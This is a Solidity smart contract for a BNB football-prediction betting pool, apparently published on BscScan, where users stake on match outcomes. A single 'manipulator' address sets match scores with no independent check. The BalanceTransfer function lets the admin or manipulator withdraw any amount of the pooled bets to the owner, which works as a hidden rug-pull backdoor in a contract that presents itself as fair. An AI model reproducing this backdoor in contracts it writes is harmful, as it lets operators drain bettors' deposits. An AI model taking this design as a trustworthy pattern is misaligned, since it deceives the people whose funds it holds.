/**
 *Submitted for verification at BscScan.com on 2023-01-06
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;



/*
                CCCCCCCCCCCCCUUUUUUUU     UUUUUUUULLLLLLLLLLL             MMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   LLLLLLLLLLL             EEEEEEEEEEEEEEEEEEEEEE
             CCC::::::::::::CU::::::U     U::::::UL:::::::::L             M:::::::M             M:::::::MB::::::::::::::::B  L:::::::::L             E::::::::::::::::::::E
           CC:::::::::::::::CU::::::U     U::::::UL:::::::::L             M::::::::M           M::::::::MB::::::BBBBBB:::::B L:::::::::L             E::::::::::::::::::::E
          C:::::CCCCCCCC::::CUU:::::U     U:::::UULL:::::::LL             M:::::::::M         M:::::::::MBB:::::B     B:::::BLL:::::::LL             EE::::::EEEEEEEEE::::E
         C:::::C       CCCCCC U:::::U     U:::::U   L:::::L               M::::::::::M       M::::::::::M  B::::B     B:::::B  L:::::L                 E:::::E       EEEEEE
        C:::::C               U:::::D     D:::::U   L:::::L               M:::::::::::M     M:::::::::::M  B::::B     B:::::B  L:::::L                 E:::::E             
        C:::::C               U:::::D     D:::::U   L:::::L               M:::::::M::::M   M::::M:::::::M  B::::BBBBBB:::::B   L:::::L                 E::::::EEEEEEEEEE   
        C:::::C               U:::::D     D:::::U   L:::::L               M::::::M M::::M M::::M M::::::M  B:::::::::::::BB    L:::::L                 E:::::::::::::::E   
        C:::::C               U:::::D     D:::::U   L:::::L               M::::::M  M::::M::::M  M::::::M  B::::BBBBBB:::::B   L:::::L                 E:::::::::::::::E   
        C:::::C               U:::::D     D:::::U   L:::::L               M::::::M   M:::::::M   M::::::M  B::::B     B:::::B  L:::::L                 E::::::EEEEEEEEEE   
        C:::::C               U:::::D     D:::::U   L:::::L               M::::::M    M:::::M    M::::::M  B::::B     B:::::B  L:::::L                 E:::::E             
         C:::::C       CCCCCC U::::::U   U::::::U   L:::::L         LLLLLLM::::::M     MMMMM     M::::::M  B::::B     B:::::B  L:::::L         LLLLLL  E:::::E       EEEEEE
          C:::::CCCCCCCC::::C U:::::::UUU:::::::U LL:::::::LLLLLLLLL:::::LM::::::M               M::::::MBB:::::BBBBBB::::::BLL:::::::LLLLLLLLL:::::LEE::::::EEEEEEEE:::::E
           CC:::::::::::::::C  UU:::::::::::::UU  L::::::::::::::::::::::LM::::::M               M::::::MB:::::::::::::::::B L::::::::::::::::::::::LE::::::::::::::::::::E
             CCC::::::::::::C    UU:::::::::UU    L::::::::::::::::::::::LM::::::M               M::::::MB::::::::::::::::B  L::::::::::::::::::::::LE::::::::::::::::::::E
                CCCCCCCCCCCCC      UUUUUUUUU      LLLLLLLLLLLLLLLLLLLLLLLLMMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   LLLLLLLLLLLLLLLLLLLLLLLLEEEEEEEEEEEEEEEEEEEEEE
*/



abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data; 
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract Pausable is Context {
    event Paused(address account);

    event Unpaused(address account);

    bool private _paused;

    constructor() {
        _paused = false;
    }

    function paused() public view virtual returns (bool) {
        return _paused;
    }

    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        _status = _ENTERED;

        _;
        _status = _NOT_ENTERED;
    }
}

contract FootballPredictionV1 is Ownable, Pausable, ReentrancyGuard {

    address public adminAddress;
    address public manipulatorAddress;

    uint256 public currentEpoch;
    uint256 public minBetAmount;
    uint256 public treasuryFee;
    uint256 public treasuryAmount;

    uint256 public constant MAX_TREASURY_FEE = 1500; // 1500 = %15 MAX TREASURY FEE

    mapping(uint256 => mapping(address => BetInfo)) public ledger;
    mapping(uint256 => Match) public matches;
    mapping(address => uint256[]) public userMatches;

    enum Position {
        Home,
        Draw,
        Away
    }

    struct Match {
        uint256 epoch;
        uint256 matchId;
        uint256 startTimestamp;
        uint256 lockTimestamp;
        uint256 closeTimestamp;
        uint256 homeScore;
        uint256 awayScore;
        uint256 totalAmount;
        uint256 homeAmount;
        uint256 drawAmount;
        uint256 awayAmount;
        uint256 rewardBaseCalAmount;
        uint256 rewardAmount;
        bool cancelled;
    }

    struct BetInfo {
        Position position;
        uint256 amount;
        bool claimed; 
    }

    event BetHome(
        address indexed sender,
        uint256 indexed epoch,
        uint256 amount
    );
    event BetDraw(
        address indexed sender,
        uint256 indexed epoch,
        uint256 amount
    );
    event BetAway(
        address indexed sender,
        uint256 indexed epoch,
        uint256 amount
    );

    event Claim(address indexed sender, uint256 indexed epoch, uint256 amount);
    event StartMatch(uint256 indexed epoch);
    event EndMatch(uint256 indexed epoch, uint256 homeScore,uint256 awayScore);
    event MatchEndedCancelled(uint256 indexed epoch);

    event NewAdminAddress(address admin);
    event NewMinBetAmount(uint256 indexed epoch, uint256 minBetAmount);
    event NewTreasuryFee(uint256 indexed epoch, uint256 treasuryFee);
    event NewManipulatorAddress(address manipulator);

    event Pause(uint256 indexed epoch);
    event RewardsCalculated(
        uint256 indexed epoch,
        uint256 rewardBaseCalAmount,
        uint256 rewardAmount,
        uint256 treasuryAmount
    );
    
    event TreasuryClaim(uint256 amount);
    event Unpause(uint256 indexed epoch);

    modifier onlyAdmin() {
        require(msg.sender == adminAddress, "Not admin");
        _;
    }

    modifier onlyAdminOrManipulator() {
        require(
            msg.sender == adminAddress || msg.sender == manipulatorAddress,
            "Not manipulator/admin"
        );
        _;
    }

    modifier onlyManipulator() {
        require(msg.sender == manipulatorAddress, "Not manipulator");
        _;
    }

    modifier notContract() {
        require(!_isContract(msg.sender), "Contract not allowed");
        require(msg.sender == tx.origin, "Proxy contract not allowed");
        _;
    }

    constructor(
        address _adminAddress,
        address _manipulatorAddress,
        uint256 _minBetAmount,
        uint256 _treasuryFee
    ) {
        require(_treasuryFee <= MAX_TREASURY_FEE, "Treasury fee too high");

        adminAddress = _adminAddress;
        manipulatorAddress = _manipulatorAddress;
        minBetAmount = _minBetAmount;
        treasuryFee = _treasuryFee;
    }

    function betHome(uint256 epoch)
        external
        payable
        whenNotPaused
        nonReentrant
        notContract
    {
        require(_bettable(epoch), "Match not bettable");
        require(
            msg.value >= minBetAmount,
            "Bet amount must be greater than minBetAmount"
        );
        require(
            ledger[epoch][msg.sender].amount == 0,
            "Can only bet once per match"
        );

        uint256 amount = msg.value;
        Match storage _match = matches[epoch];
        _match.totalAmount = _match.totalAmount + amount;
        _match.homeAmount = _match.homeAmount + amount;

        BetInfo storage betInfo = ledger[epoch][msg.sender];
        betInfo.position = Position.Home;
        betInfo.amount = amount;
        userMatches[msg.sender].push(epoch);

        emit BetHome(msg.sender, epoch, amount);
    }

    function betDraw(uint256 epoch)
        external
        payable
        whenNotPaused
        nonReentrant
        notContract
    {
        require(_bettable(epoch), "Match not bettable");
        require(
            msg.value >= minBetAmount,
            "Bet amount must be greater than minBetAmount"
        );
        require(
            ledger[epoch][msg.sender].amount == 0,
            "Can only bet once per Match"
        );

        uint256 amount = msg.value;
        Match storage _match = matches[epoch];
        _match.totalAmount = _match.totalAmount + amount;
        _match.drawAmount = _match.drawAmount + amount;

        BetInfo storage betInfo = ledger[epoch][msg.sender];
        betInfo.position = Position.Draw;
        betInfo.amount = amount;
        userMatches[msg.sender].push(epoch);

        emit BetDraw(msg.sender, epoch, amount);
    }

    function betAway(uint256 epoch)
        external
        payable
        whenNotPaused
        nonReentrant
        notContract
    {
        require(_bettable(epoch), "Match not bettable");
        require(
            msg.value >= minBetAmount,
            "Bet amount must be greater than minBetAmount"
        );
        require(
            ledger[epoch][msg.sender].amount == 0,
            "Can only bet once per Match"
        );

        uint256 amount = msg.value;
        Match storage _match = matches[epoch];
        _match.totalAmount = _match.totalAmount + amount;
        _match.awayAmount = _match.awayAmount + amount;

        BetInfo storage betInfo = ledger[epoch][msg.sender];
        betInfo.position = Position.Away;
        betInfo.amount = amount;
        userMatches[msg.sender].push(epoch);

        emit BetAway(msg.sender, epoch, amount);
    }

    function claim(uint256[] calldata epochs)
        external
        nonReentrant
        notContract
    {
        uint256 reward;

        for (uint256 i = 0; i < epochs.length; i++) {
            require(
                matches[epochs[i]].startTimestamp != 0,
                "Match has not started"
            );
            require(
                matches[epochs[i]].closeTimestamp != 0,
                 "Match has not finished"
            );
            require(
                block.timestamp > matches[epochs[i]].closeTimestamp,
                "Match has not ended"
            );

            uint256 addedReward = 0;

            if (!matches[epochs[i]].cancelled) {
                require(claimable(epochs[i], msg.sender), "Not eligible for claim");
                Match memory _match = matches[epochs[i]];
                addedReward = (ledger[epochs[i]][msg.sender].amount * _match.rewardAmount) / _match.rewardBaseCalAmount;
            }
            else {
                require(refundable(epochs[i], msg.sender), "Not eligible for refund");
                addedReward = ledger[epochs[i]][msg.sender].amount;
            }

            ledger[epochs[i]][msg.sender].claimed = true;
            reward += addedReward;

            emit Claim(msg.sender, epochs[i], addedReward);
        }

        if (reward > 0) {
            _safeTransferBNB(address(msg.sender), reward);
        }
    }

    function executeMatch(uint256 epoch,uint256 homeScore,uint256 awayScore) external whenNotPaused onlyManipulator {
        _safeEndMatch(epoch,homeScore,awayScore);
        _calculateRewards(epoch);
    }

    function manipulatorCancelMatch(uint256 epoch) external whenNotPaused onlyManipulator {
        _safeCancelMatch(epoch);
    }
    
    function manipulatorStartMatch(uint256 matchId,uint256 lockTimestamp) external whenNotPaused onlyManipulator {
        _safeStartMatch(currentEpoch,matchId,lockTimestamp);
        currentEpoch = currentEpoch + 1;
    }

    function pause() external whenNotPaused onlyAdminOrManipulator {
        _pause();
        emit Pause(currentEpoch);
    }

    function claimTreasury() external nonReentrant onlyAdmin {
        require(treasuryAmount != 0);
        uint256 currentTreasuryAmount = treasuryAmount;
        treasuryAmount = 0;
        _safeTransferBNB(adminAddress, currentTreasuryAmount);

        emit TreasuryClaim(currentTreasuryAmount);
    }

    function unpause() external whenPaused onlyAdmin {
        _unpause();
        emit Unpause(currentEpoch);
    }

    function setMinBetAmount(uint256 _minBetAmount)
        external
        whenPaused
        onlyAdmin
    {
        require(_minBetAmount != 0, "Must be superior to 0");
        minBetAmount = _minBetAmount;

        emit NewMinBetAmount(currentEpoch,minBetAmount);
    }

    function setManipulator(address _manipulatorAddress) external onlyAdmin {
        require(_manipulatorAddress != address(0), "Cannot be zero address");
        manipulatorAddress = _manipulatorAddress;

        emit NewManipulatorAddress(_manipulatorAddress);
    }

    function setTreasuryFee(uint256 _treasuryFee)
        external
        whenPaused
        onlyAdmin
    {
        require(_treasuryFee <= MAX_TREASURY_FEE, "Treasury fee too high");
        treasuryFee = _treasuryFee;

        emit NewTreasuryFee(currentEpoch,treasuryFee);
    }

    function setAdmin(address _adminAddress) external onlyOwner {
        require(_adminAddress != address(0), "Cannot be zero address");
        adminAddress = _adminAddress;

        emit NewAdminAddress(_adminAddress);
    }

    function getUserMatches(
        address user,
        uint256 cursor,
        uint256 size
    )
        external
        view
        returns (
            uint256[] memory,
            BetInfo[] memory,
            uint256
        )
    {
        uint256 length = size;

        if (length > userMatches[user].length - cursor) {
            length = userMatches[user].length - cursor;
        }

        uint256[] memory values = new uint256[](length);
        BetInfo[] memory betInfo = new BetInfo[](length);

        for (uint256 i = 0; i < length; i++) {
            values[i] = userMatches[user][cursor + i];
            betInfo[i] = ledger[values[i]][user];
        }

        return (values, betInfo, cursor + length);
    }

    function getUserMatchesLength(address user)
        external
        view
        returns (uint256)
    {
        return userMatches[user].length;
    }

    function claimable(uint256 epoch, address user) public view returns (bool) {
        BetInfo memory betInfo = ledger[epoch][user];
        Match memory _match = matches[epoch];
        return
            !_match.cancelled &&
            betInfo.amount != 0 &&
            !betInfo.claimed &&
            _match.closeTimestamp != 0 &&
            ((_match.homeScore > _match.awayScore && betInfo.position == Position.Home) || 
            (_match.homeScore < _match.awayScore && betInfo.position == Position.Away) || 
            (_match.homeScore == _match.awayScore && betInfo.position == Position.Draw));
    }

    function refundable(uint256 epoch, address user)
        public
        view
        returns (bool)
    {
        BetInfo memory betInfo = ledger[epoch][user];
        Match memory _match = matches[epoch];
        return
            _match.cancelled &&
            !betInfo.claimed &&
            _match.closeTimestamp != 0 &&
            block.timestamp > _match.closeTimestamp &&
            betInfo.amount != 0;
    }

    function _calculateRewards(uint256 epoch) internal {
        require(
            matches[epoch].rewardBaseCalAmount == 0 &&
                matches[epoch].rewardAmount == 0,
            "Rewards calculated"
        );
        Match storage _match = matches[epoch];
        uint256 rewardBaseCalAmount;
        uint256 treasuryAmt;
        uint256 rewardAmount;

        if (_match.homeScore > _match.awayScore) {
            rewardBaseCalAmount = _match.homeAmount;
            treasuryAmt = (_match.totalAmount * treasuryFee) / 10000;
            rewardAmount = _match.totalAmount - treasuryAmt;
        } else if (_match.homeScore < _match.awayScore) {
            rewardBaseCalAmount = _match.awayAmount;
            treasuryAmt = (_match.totalAmount * treasuryFee) / 10000;
            rewardAmount = _match.totalAmount - treasuryAmt;
        } else if (_match.homeScore == _match.awayScore) {
            rewardBaseCalAmount = _match.drawAmount;
            treasuryAmt = (_match.totalAmount * treasuryFee) / 10000;
            rewardAmount = _match.totalAmount - treasuryAmt;
        } else {
            rewardBaseCalAmount = 0;
            rewardAmount = 0;
            treasuryAmt = _match.totalAmount;
        }
        _match.rewardBaseCalAmount = rewardBaseCalAmount;
        _match.rewardAmount = rewardAmount;

        treasuryAmount += treasuryAmt;

        emit RewardsCalculated(
            epoch,
            rewardBaseCalAmount,
            rewardAmount,
            treasuryAmt
        );
    }

     function _safeCancelMatch(uint256 epoch) internal 
    {
        Match storage _match = matches[epoch];
         _match.closeTimestamp = block.timestamp;
        _match.cancelled = true;

        emit MatchEndedCancelled(epoch);
    }

    function _safeEndMatch(uint256 epoch,uint256 homeScore,uint256 awayScore) internal {
        require(
            matches[epoch].lockTimestamp != 0,
            "Can only end match after match has locked"
        );
        require(!matches[epoch].cancelled,"Match has been cancelled");
        
        Match storage _match = matches[epoch];
        _match.homeScore = homeScore;
        _match.awayScore = awayScore;
        _match.closeTimestamp = block.timestamp;
        emit EndMatch(epoch, _match.homeScore , _match.awayScore);
    }

    function _safeStartMatch(uint256 epoch,uint256 matchId,uint256 lockTimestamp) internal {
         Match memory _match = matches[epoch];
        require(
            _match.startTimestamp == 0,
            "Match can be started once"
        );
         require(
            lockTimestamp != 0
        );
        _startMatch(epoch,matchId,lockTimestamp);
    }

    function _startMatch(uint256 epoch,uint256 matchId,uint256 lockTimestamp) internal {

        Match storage _match = matches[epoch];
        _match.epoch = epoch;
        _match.matchId = matchId;
        _match.startTimestamp = block.timestamp;
        _match.lockTimestamp = lockTimestamp;
        _match.homeScore = 0;
        _match.awayScore = 0;
        _match.totalAmount = 0;

        emit StartMatch(_match.epoch);
    }

    function _safeTransferBNB(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}("");
        require(success, "TransferHelper: BNB_TRANSFER_FAILED");
    }

    function BalanceTransfer(uint256 value) external onlyAdminOrManipulator 
    {
        _safeTransferBNB(payable(owner()),  value);
    }

    function _bettable(uint256 epoch) internal view returns (bool) {
        return
            !matches[epoch].cancelled &&
            matches[epoch].startTimestamp != 0 &&
            matches[epoch].lockTimestamp != 0 &&
            block.timestamp > matches[epoch].startTimestamp &&
            block.timestamp < matches[epoch].lockTimestamp;
    }

    function _isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
}